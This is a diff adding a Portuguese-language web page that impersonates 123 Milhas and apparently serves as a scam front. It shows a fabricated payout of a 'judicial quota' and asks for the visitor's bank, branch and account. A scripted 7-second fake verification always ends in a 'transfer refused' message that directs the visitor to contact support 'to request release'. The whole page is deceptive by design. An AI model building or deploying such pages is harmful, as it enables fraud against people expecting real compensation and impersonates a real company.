@@ -1,0 +1,657 @@
+<!doctype html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover" />
+    <title>123 Milhas - Transferir Cota</title>
+
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+
+    <!-- Google Fonts -->
+    <link
+      href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800;900&family=Nunito:wght@400;600;700&display=swap"
+      rel="stylesheet"
+    />
+
+    <style>
+      :root {
+        --primary-color: #f05929;
+        --primary-dark: #d94a1a;
+        --primary-light: #ff8c5a;
+        --text-dark: #1a1a2e;
+        --text-light: #6c757d;
+        --bg-card: #ffffff;
+        --border-color: #e9ecef;
+        --shadow-sm: 0 2px 8px rgba(0, 0, 0, 0.04);
+        --shadow-md: 0 5px 20px rgba(0, 0, 0, 0.06);
+        --shadow-lg: 0 10px 30px rgba(0, 0, 0, 0.08);
+      }
+
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: 'Montserrat', 'Nunito', sans-serif;
+        background: linear-gradient(135deg, #fff5f0 0%, #ffffff 50%, #fef9f5 100%);
+        min-height: 100vh;
+        color: var(--text-dark);
+      }
+
+      .main-container {
+        max-width: 500px;
+        margin: 0 auto;
+        padding: 1rem 1rem 2rem;
+        min-height: 100vh;
+      }
+
+      .page-header {
+        display: flex;
+        align-items: center;
+        gap: 1rem;
+        margin-bottom: 1.5rem;
+        padding-top: 1rem;
+      }
+
+      .btn-back {
+        background: none;
+        border: none;
+        font-size: 1.3rem;
+        color: var(--primary-color);
+        cursor: pointer;
+        width: 40px;
+        height: 40px;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        transition: all 0.2s;
+      }
+
+      .btn-back:hover {
+        background: rgba(240, 89, 41, 0.1);
+      }
+
+      .page-header h1 {
+        font-size: 1.3rem;
+        font-weight: 800;
+        color: var(--text-dark);
+      }
+
+      .transfer-card {
+        background: var(--bg-card);
+        border-radius: 28px;
+        padding: 1.8rem;
+        box-shadow: var(--shadow-md);
+        border: 1px solid var(--border-color);
+      }
+
+      .valor-disponivel {
+        text-align: center;
+        margin-bottom: 2rem;
+        padding-bottom: 1.5rem;
+        border-bottom: 2px solid var(--border-color);
+      }
+
+      .valor-disponivel .label {
+        font-size: 0.7rem;
+        text-transform: uppercase;
+        letter-spacing: 2px;
+        color: var(--text-light);
+        font-weight: 600;
+      }
+
+      .valor-disponivel .valor {
+        font-size: 2rem;
+        font-weight: 800;
+        color: var(--primary-color);
+        margin-top: 0.3rem;
+      }
+
+      .form-group {
+        margin-bottom: 1.5rem;
+      }
+
+      .form-label {
+        font-size: 0.7rem;
+        font-weight: 700;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+        color: var(--text-light);
+        display: block;
+        margin-bottom: 0.6rem;
+      }
+
+      .custom-select {
+        width: 100%;
+        padding: 1rem;
+        font-size: 0.9rem;
+        border: 2px solid var(--border-color);
+        border-radius: 20px;
+        background: white;
+        font-family: 'Montserrat', sans-serif;
+        font-weight: 500;
+        color: var(--text-dark);
+        cursor: pointer;
+        transition: all 0.2s;
+        appearance: none;
+        background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%23f05929' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'><polyline points='6 9 12 15 18 9'></polyline></svg>");
+        background-repeat: no-repeat;
+        background-position: right 1rem center;
+      }
+
+      .custom-select:focus {
+        outline: none;
+        border-color: var(--primary-color);
+      }
+
+      .input-group {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 1rem;
+      }
+
+      input {
+        width: 100%;
+        padding: 1rem;
+        font-size: 0.9rem;
+        border: 2px solid var(--border-color);
+        border-radius: 20px;
+        font-family: 'Montserrat', sans-serif;
+        transition: all 0.2s;
+      }
+
+      input:focus {
+        outline: none;
+        border-color: var(--primary-color);
+      }
+
+      input::placeholder {
+        color: #cbd5e0;
+        font-weight: 400;
+      }
+
+      .btn-confirmar {
+        width: 100%;
+        background: linear-gradient(135deg, var(--primary-color) 0%, var(--primary-dark) 100%);
+        color: white;
+        border: none;
+        padding: 1rem;
+        border-radius: 30px;
+        font-size: 1rem;
+        font-weight: 800;
+        cursor: pointer;
+        transition: all 0.2s;
+        margin-top: 1rem;
+        position: relative;
+      }
+
+      .btn-confirmar:hover {
+        transform: translateY(-2px);
+        box-shadow: var(--shadow-lg);
+      }
+
+      .btn-confirmar:disabled {
+        opacity: 0.7;
+        cursor: not-allowed;
+        transform: none;
+      }
+
+      /* Loading spinner */
+      .spinner {
+        display: inline-block;
+        width: 20px;
+        height: 20px;
+        border: 2px solid rgba(255, 255, 255, 0.3);
+        border-radius: 50%;
+        border-top-color: white;
+        animation: spin 0.8s linear infinite;
+        margin-right: 8px;
+      }
+
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+
+      /* Modal TRANSFERÊNCIA RECUSADA */
+      .modal-recusado {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.7);
+        z-index: 2000;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        animation: fadeIn 0.3s ease;
+      }
+
+      .modal-recusado-content {
+        background: white;
+        border-radius: 32px;
+        max-width: 350px;
+        width: 90%;
+        padding: 2rem 1.5rem;
+        text-align: center;
+        animation: slideUp 0.3s ease;
+      }
+
+      .modal-recusado-content .icon-circle {
+        width: 70px;
+        height: 70px;
+        background: rgba(220, 53, 69, 0.1);
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 0 auto 1rem;
+      }
+
+      .modal-recusado-content i {
+        font-size: 2.5rem;
+        color: #dc3545;
+      }
+
+      .modal-recusado-content h2 {
+        font-size: 1.3rem;
+        font-weight: 800;
+        margin-bottom: 0.8rem;
+        color: var(--text-dark);
+      }
+
+      .modal-recusado-content p {
+        font-size: 0.85rem;
+        color: var(--text-light);
+        margin-bottom: 1.5rem;
+        line-height: 1.5;
+      }
+
+      .btn-fechar-modal {
+        background: var(--primary-color);
+        color: white;
+        border: none;
+        padding: 0.8rem 1.5rem;
+        border-radius: 30px;
+        font-size: 0.9rem;
+        font-weight: 700;
+        cursor: pointer;
+        width: 100%;
+      }
+
+      /* Countdown timer */
+      .countdown-timer {
+        position: fixed;
+        bottom: 30px;
+        left: 50%;
+        transform: translateX(-50%);
+        background: rgba(0, 0, 0, 0.8);
+        color: white;
+        padding: 12px 24px;
+        border-radius: 50px;
+        font-size: 0.9rem;
+        font-weight: 600;
+        z-index: 1500;
+        animation: fadeInUp 0.3s ease;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        backdrop-filter: blur(10px);
+      }
+
+      .countdown-timer i {
+        font-size: 1.1rem;
+      }
+
+      .countdown-number {
+        background: var(--primary-color);
+        padding: 4px 12px;
+        border-radius: 40px;
+        font-weight: 800;
+        font-size: 1rem;
+      }
+
+      @keyframes fadeInUp {
+        from {
+          opacity: 0;
+          transform: translateX(-50%) translateY(20px);
+        }
+        to {
+          opacity: 1;
+          transform: translateX(-50%) translateY(0);
+        }
+      }
+
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+        }
+        to {
+          opacity: 1;
+        }
+      }
+
+      @keyframes slideUp {
+        from {
+          opacity: 0;
+          transform: translateY(30px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      .logo {
+        position: relative;
+        left: 10px;
+        top: 10px;
+      }
+      .countdown-timer {
+        width: 90%;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="header-simples">
+      <img src="{{ url_for('static', filename='assets/img/logo.avif') }}" alt="123 Milhas" class="logo" />
+    </div>
+    <div class="main-container">
+      <div class="page-header">
+        <button class="btn-back" onclick="window.location.href = '/home'">
+          <i class="fas fa-arrow-left"></i>
+        </button>
+        <h1>TRANSFERIR COTA</h1>
+      </div>
+
+      <div class="transfer-card">
+        <div class="valor-disponivel">
+          <div class="label">VALOR DISPONÍVEL</div>
+          <div class="valor" id="valorDisponivel">R$ 4.574,52</div>
+        </div>
+
+        <div class="form-group">
+          <div class="form-label">BANCO DE DESTINO</div>
+          <select class="custom-select" id="bancoDestino">
+            <option value="">Selecione o banco</option>
+          </select>
+        </div>
+
+        <div class="input-group">
+          <div class="form-group">
+            <div class="form-label">AGÊNCIA</div>
+            <input type="text" id="agencia" placeholder="0001" maxlength="10" />
+          </div>
+          <div class="form-group">
+            <div class="form-label">CONTA COM DÍGITO</div>
+            <input type="text" id="conta" placeholder="000000-0" oninput="mascararConta(this)" />
+          </div>
+        </div>
+
+        <button class="btn-confirmar" id="btnConfirmar" onclick="confirmarTransferencia()">CONFIRMAR ENVIO</button>
+      </div>
+    </div>
+
+    <script>
+      // Variáveis de controle
+      let timeoutId = null
+      let countdownInterval = null
+
+      // ===== FUNÇÃO DE MÁSCARA PARA CONTA =====
+      function mascararConta(input) {
+        let valor = input.value.replace(/\D/g, '')
+
+        if (valor.length > 8) {
+          valor = valor.substring(0, 8)
+        }
+
+        if (valor.length > 6) {
+          input.value = valor.substring(0, 6) + '-' + valor.substring(6, 8)
+        } else if (valor.length > 0) {
+          input.value = valor
+        } else {
+          input.value = ''
+        }
+      }
+
+      // ===== LISTA DE BANCOS =====
+      const bancosBrasil = [
+        { codigo: '001', nome: 'Banco do Brasil' },
+        { codigo: '033', nome: 'Santander' },
+        { codigo: '104', nome: 'Caixa Econômica Federal' },
+        { codigo: '237', nome: 'Bradesco' },
+        { codigo: '341', nome: 'Itaú Unibanco' },
+        { codigo: '389', nome: 'Banco Mercantil do Brasil' },
+        { codigo: '422', nome: 'Banco Safra' },
+        { codigo: '633', nome: 'Banco Rendimento' },
+        { codigo: '652', nome: 'Itaú Unibanco Holding' },
+        { codigo: '653', nome: 'Banco BTG Pactual' },
+        { codigo: '655', nome: 'Banco Votorantim' },
+        { codigo: '707', nome: 'Banco Daycoval' },
+        { codigo: '739', nome: 'Banco Cetelem' },
+        { codigo: '743', nome: 'Banco Semear' },
+        { codigo: '745', nome: 'Banco Citibank' },
+        { codigo: '746', nome: 'Banco Modal' },
+        { codigo: '747', nome: 'Banco Rabobank' },
+        { codigo: '748', nome: 'Banco Cooperativo Sicredi' },
+        { codigo: '749', nome: 'Banco Cooperativo do Brasil - Sicoob' },
+        { codigo: '751', nome: 'Scotiabank Brasil' },
+        { codigo: '752', nome: 'Banco BNP Paribas Brasil' },
+        { codigo: '753', nome: 'Banco Novum' },
+        { codigo: '754', nome: 'Banco Sistema' },
+        { codigo: '755', nome: 'Banco Fator' },
+        { codigo: '756', nome: 'Banco Cooperativo Sicoob' },
+        { codigo: '757', nome: 'Banco Keb Hana do Brasil' },
+        { codigo: '260', nome: 'Nubank' },
+        { codigo: '077', nome: 'Banco Inter' },
+        { codigo: '212', nome: 'Banco Original' },
+        { codigo: '290', nome: 'PagSeguro Internet S.A.' },
+        { codigo: '323', nome: 'Mercado Pago' },
+        { codigo: '332', nome: 'Banco C6 S.A.' },
+        { codigo: '380', nome: 'PicPay' },
+        { codigo: '197', nome: 'Banco Will S.A.' },
+        { codigo: '348', nome: 'Banco XP S.A.' },
+        { codigo: '102', nome: 'Banco Next' },
+        { codigo: '093', nome: 'Banco Digio' },
+        { codigo: '132', nome: 'Banco Bmg' },
+        { codigo: '173', nome: 'Banco BS2' },
+        { codigo: '119', nome: 'Banco Western Union' },
+        { codigo: '253', nome: 'Banco Genial' },
+        { codigo: '268', nome: 'Banco Bari' },
+        { codigo: '307', nome: 'Banco Terra' },
+        { codigo: '318', nome: 'Banco BMG' },
+        { codigo: '336', nome: 'Banco C6 Bank' },
+        { codigo: '367', nome: 'Banco Votorantim (BV)' }
+      ]
+
+      // Carregar dados do usuário do localStorage
+      const userData = JSON.parse(localStorage.getItem('userData')) || {
+        nome: 'VANDERLUCIÁ',
+        creditoTotal: 22872.6,
+        valorCota: 5718.15,
+        cotaLiberada: 4574.52,
+        totalRecebido: 4574.52,
+        cotasRestantes: 3
+      }
+
+      // Atualizar valor disponível
+      document.getElementById('valorDisponivel').innerHTML =
+        `R$ ${userData.cotaLiberada.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}`
+
+      // Popular dropdown de bancos
+      const selectBanco = document.getElementById('bancoDestino')
+      bancosBrasil.forEach((banco) => {
+        const option = document.createElement('option')
+        option.value = banco.codigo
+        option.textContent = `${banco.codigo} - ${banco.nome}`
+        selectBanco.appendChild(option)
+      })
+
+      // Função para mostrar contador regressivo
+      function mostrarCountdown(segundos) {
+        // Remove countdown existente
+        const countdownExistente = document.querySelector('.countdown-timer')
+        if (countdownExistente) countdownExistente.remove()
+
+        if (countdownInterval) clearInterval(countdownInterval)
+
+        const countdownHtml = `
+          <div class="countdown-timer" id="countdownTimer">
+            <i class="fas fa-hourglass-half"></i>
+            <span>Verificando dados bancários...</span>
+          </div>
+        `
+        document.body.insertAdjacentHTML('beforeend', countdownHtml)
+
+        let tempoRestante = segundos
+        const countdownNumberEl = document.getElementById('countdownNumber')
+
+        countdownInterval = setInterval(() => {
+          tempoRestante--
+          if (countdownNumberEl) {
+            countdownNumberEl.textContent = tempoRestante
+          }
+
+          if (tempoRestante <= 0) {
+            clearInterval(countdownInterval)
+            const countdownTimer = document.getElementById('countdownTimer')
+            if (countdownTimer) countdownTimer.remove()
+          }
+        }, 1000)
+      }
+
+      // Função para remover countdown
+      function removerCountdown() {
+        if (countdownInterval) {
+          clearInterval(countdownInterval)
+          countdownInterval = null
+        }
+        const countdownTimer = document.getElementById('countdownTimer')
+        if (countdownTimer) countdownTimer.remove()
+      }
+
+      // Função para mostrar loading no botão
+      function mostrarLoadingBotao(mostrar) {
+        const btn = document.getElementById('btnConfirmar')
+        if (mostrar) {
+          btn.disabled = true
+          btn.innerHTML = '<span class="spinner"></span> PROCESSANDO...'
+        } else {
+          btn.disabled = false
+          btn.innerHTML = 'CONFIRMAR ENVIO'
+        }
+      }
+
+      // Função para mostrar modal de erro com delay de 7 segundos
+      function mostrarModalComDelay() {
+        let tempoRestante = 7
+
+        // Mostrar countdown
+        mostrarCountdown(tempoRestante)
+
+        // Configurar timeout para mostrar o modal após 7 segundos
+        timeoutId = setTimeout(() => {
+          removerCountdown()
+          mostrarModalRecusado()
+          mostrarLoadingBotao(false)
+          timeoutId = null
+        }, 7000)
+      }
+
+      // Cancelar timeout se necessário
+      function cancelarTimeout() {
+        if (timeoutId) {
+          clearTimeout(timeoutId)
+          timeoutId = null
+        }
+        removerCountdown()
+      }
+
+      function mostrarModalRecusado() {
+        const modalExistente = document.getElementById('modalRecusado')
+        if (modalExistente) modalExistente.remove()
+
+        const modalHtml = `
+          <div id="modalRecusado" class="modal-recusado">
+            <div class="modal-recusado-content">
+              <div class="icon-circle">
+                <i class="fas fa-ban"></i>
+              </div>
+              <h2>TRANSFERÊNCIA RECUSADA</h2>
+              <p>O banco de destino não autorizou o recebimento desta cota judicial no momento, entre em contato para solicitar a liberação ou tente outra conta da mesma titularidade, caso persista, chame o suporte via chat.</p>
+              <button class="btn-fechar-modal" onclick="fecharModal()">
+                VOLTAR
+              </button>
+            </div>
+          </div>
+        `
+        document.body.insertAdjacentHTML('beforeend', modalHtml)
+      }
+
+      function fecharModal() {
+        const modal = document.getElementById('modalRecusado')
+        if (modal) modal.remove()
+        // Resetar o botão caso ainda esteja em loading
+        mostrarLoadingBotao(false)
+        cancelarTimeout()
+      }
+
+      // Função principal de confirmação
+      function confirmarTransferencia() {
+        // Cancelar qualquer timeout pendente
+        cancelarTimeout()
+
+        const banco = document.getElementById('bancoDestino').value
+        const agencia = document.getElementById('agencia').value.trim()
+        const conta = document.getElementById('conta').value.trim()
+
+        if (!banco) {
+          alert('❌ Por favor, selecione um banco de destino')
+          return
+        }
+
+        if (!agencia) {
+          alert('❌ Por favor, digite a agência')
+          return
+        }
+
+        if (!conta) {
+          alert('❌ Por favor, digite a conta')
+          return
+        }
+
+        // Mostrar loading no botão
+        mostrarLoadingBotao(true)
+
+        // Iniciar o delay de 7 segundos antes de mostrar o modal de erro
+        mostrarModalComDelay()
+      }
+
+      // Prevenir que o usuário saia da página enquanto processa
+      window.addEventListener('beforeunload', function (e) {
+        if (timeoutId !== null) {
+          e.preventDefault()
+          e.returnValue = 'A transferência está sendo processada. Tem certeza que deseja sair?'
+          return 'A transferência está sendo processada. Tem certeza que deseja sair?'
+        }
+      })
+
+      // Limpar timeout quando a página for descarregada
+      window.addEventListener('unload', function () {
+        if (timeoutId) {
+          clearTimeout(timeoutId)
+        }
+        if (countdownInterval) {
+          clearInterval(countdownInterval)
+        }
+      })
+    </script>
+  </body>
+</html>
+
